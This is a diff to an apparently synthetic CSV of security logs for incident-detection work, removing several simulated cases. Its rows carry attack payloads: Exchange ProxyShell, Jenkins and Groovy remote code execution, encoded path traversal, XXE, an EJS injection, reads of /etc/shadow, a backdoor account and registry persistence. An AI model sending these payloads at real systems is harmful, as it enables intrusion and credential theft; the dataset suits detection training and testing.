@@ -1,4 +1,4 @@
-event_id,batch_id,incident_id,case_id,timestamp,source,log_id,content
+﻿event_id,batch_id,incident_id,case_id,timestamp,source,log_id,content
 WAF0410001,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:03+08:00,waf,WAF0410001,host=app-web-31.ops-corp.com POST /ecp/7b37f0/ecp.aspx X-BEResource=localhost~1942062522 502
 WEB0410002,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:05+08:00,web,WEB0410002,host=app-web-31.ops-corp.com POST /ecp/7b37f0/ecp.aspx X-BEResource=localhost~1942062522 502 upstream_timeout
 HID0410003,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:40+08:00,hids,HID0410003,host=app-web-31.ops-corp.com 进程创建: w3wp.exe (IIS APPPOOL\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all
@@ -84,10 +84,6 @@ SIM-1010-1,SIM-B-1010,,,2026-06-06 23:48:26,waf,WAF0241503,/cli command=help&arg
 SIM-1010-2,SIM-B-1010,,,2026-06-06 23:48:27,web,WEB0243075,/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3
 SIM-1010-3,SIM-B-1010,,,2026-06-06 23:48:29,rasp,RASP0267187,"https://app-java-134.ops-corp.com/cli {""file_read"": ""@/etc/passwd"", ""cli"": ""help""} Mozilla/5.0 (Windows NT 11."
 SIM-1010-4,SIM-B-1010,,,2026-06-06 23:50:00,hids,HID0261725,cat /var/lib/jenkins/config.xml <== /bin/sh -c 'cat config.xml' <== java -jar /opt/app/jenkins.war
-SIM-1011-1,SIM-B-1011,,,2026-06-01 02:47:06,waf,WAF0200842,/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
-SIM-1011-2,SIM-B-1011,,,2026-06-01 02:47:08,web,WEB0202149,/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
-SIM-1011-3,SIM-B-1011,,,2026-06-01 02:47:09,rasp,RASP0222195,"https://app-php-44.ops-corp.com/index.php {""path_traversal"": ""%252e%252e%252f""} Mozilla/5.0 (X11; Linux x86_64"
-SIM-1011-4,SIM-B-1011,,,2026-06-01 02:48:35,hids,HID0217661,cat /etc/shadow /usr/bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== php-fpm: pool www
 SIM-1012-1,SIM-B-1012,,,2026-06-08 13:31:44,waf,WAF0252379,/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
 SIM-1012-2,SIM-B-1012,,,2026-06-08 13:31:45,web,WEB0254022,/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
 SIM-1012-3,SIM-B-1012,,,2026-06-08 13:31:47,rasp,RASP0279222,"https://app-php-118.ops-corp.com/index.php {""fpm_newline"": ""auto_prepend""} Mozilla/5.0 (Macintosh; Intel Mac O"
@@ -250,13 +246,6 @@ SIM-1038-4,SIM-B-1038,,,2026-06-05 01:09:50,hids,HID0247143,"ssh -i /tmp/.key -o
 SIM-1038-5,SIM-B-1038,,,2026-06-25 01:09:50,dns,DNS0380559,353ab2b4.tbnxmu-2c8b.com A 10.10.41.111
 SIM-1038-6,SIM-B-1038,,,2026-06-25 01:10:12,dns,DNS0380560,415e2098.tbnxmu-2c8b.com A 10.10.35.191
 SIM-1038-7,SIM-B-1038,,,2026-06-25 01:10:51,dns,DNS0380564,bc793874.tbnxmu-2c8b.com A 203.0.113.49
-SIM-1039-1,SIM-B-1039,,,2026-06-01 08:28:06,waf,WAF0202480,"/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT"
-SIM-1039-2,SIM-B-1039,,,2026-06-01 08:28:07,web,WEB0203798,"/api/v1/soap/endpoint <!DOCTYPE r [<!ENTITY % a SYSTEM ""http://10.20.5.19/e.dtd"">%a;]> Mozilla/5.0 (Windows NT"
-SIM-1039-3,SIM-B-1039,,,2026-06-01 08:28:09,rasp,RASP0224009,"https://app-java-202.ops-corp.com/api/v1/soap/endpoint {""xxe"": ""ext_entity""} Mozilla/5.0 (Windows NT 10.0; Win"
-SIM-1039-4,SIM-B-1039,,,2026-06-01 08:29:35,hids,HID0219437,cat /etc/hostname /bin/cat cat /etc/hostname <== /bin/sh -c 'cat /etc/hostname' <== java -jar /opt/app/api.jar
-SIM-1039-5,SIM-B-1039,,,2026-06-01 22:17:35,dns,DNS0208918,e10b4d76.kqwyvs-6a03.org A 203.0.113.123
-SIM-1039-6,SIM-B-1039,,,2026-06-01 22:18:20,dns,DNS0208922,078390f8.kqwyvs-6a03.org A 10.10.47.6
-SIM-1039-7,SIM-B-1039,,,2026-06-01 22:19:46,dns,DNS0208930,4ec37f43.kqwyvs-6a03.org A 10.10.39.86
 SIM-1040-1,SIM-B-1040,,,2026-06-14 10:30:41,waf,WAF0293029,/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
 SIM-1040-2,SIM-B-1040,,,2026-06-14 10:30:43,web,WEB0294936,/api/v1/import <dynamic-proxy><interface>java.lang.Comparable</interface> Mozilla/5.0 (Macintosh; Intel Mac OS
 SIM-1040-3,SIM-B-1040,,,2026-06-14 10:30:44,rasp,RASP0324201,"https://app-java-143.ops-corp.com/api/v1/import {""xstream"": ""dynamic-proxy""} Mozilla/5.0 (Macintosh; Intel Mac"
@@ -375,11 +364,6 @@ SIM-1074-2,SIM-B-1074,,,2026-06-14 22:59:06,web,WEB0298556,/manager/deploy?path=
 SIM-1074-3,SIM-B-1074,,,2026-06-14 22:59:07,rasp,RASP0328181,"https://app-tomcat-171.ops-corp.com/manager/deploy?path=/svc&update=true {""war_deploy"": ""manager/deploy"", ""arc"
 SIM-1074-4,SIM-B-1074,,,2026-06-14 23:00:33,hids,HID0321460,cmd.exe /c ipconfig /all cmd.exe cmd.exe /c ipconfig /all <== services.exe <== wininit.exe
 SIM-1074-5,SIM-B-1074,,,2026-06-14 23:01:04,hids,HID0321463,cmd.exe /c net user /add svc_backup Xr7#pqZ2! cmd.exe cmd.exe /c net user /add svc_backup Xr7#pqZ2! <== servic
-SIM-1075-1,SIM-B-1075,,,2026-06-01 16:18:11,waf,WAF0204739,/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
-SIM-1075-2,SIM-B-1075,,,2026-06-01 16:18:12,web,WEB0206072,/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
-SIM-1075-3,SIM-B-1075,,,2026-06-01 16:18:13,rasp,RASP0226508,"https://app-java-37.ops-corp.com/webtools/control/ProgramExport {""groovy"": ""Thread.start"", ""auth_bypass"": ""Pro"
-SIM-1075-4,SIM-B-1075,,,2026-06-01 16:19:12,hids,HID0221883,whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\ofbiz\ofbiz.jar
-SIM-1075-5,SIM-B-1075,,,2026-06-01 16:21:12,hids,HID0221893,reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f reg.exe reg.exe add HKCU <== serv
 SIM-1076-1,SIM-B-1076,,,2026-06-03 00:11:13,waf,WAF0213932,/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
 SIM-1076-2,SIM-B-1076,,,2026-06-03 00:11:15,web,WEB0215325,/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
 SIM-1076-3,SIM-B-1076,,,2026-06-03 00:11:17,rasp,RASP0236680,"https://app-node-126.ops-corp.com/api/render {""ejs"": ""outputFunctionName"", ""exec"": ""obfuscated-require""} Mozil"
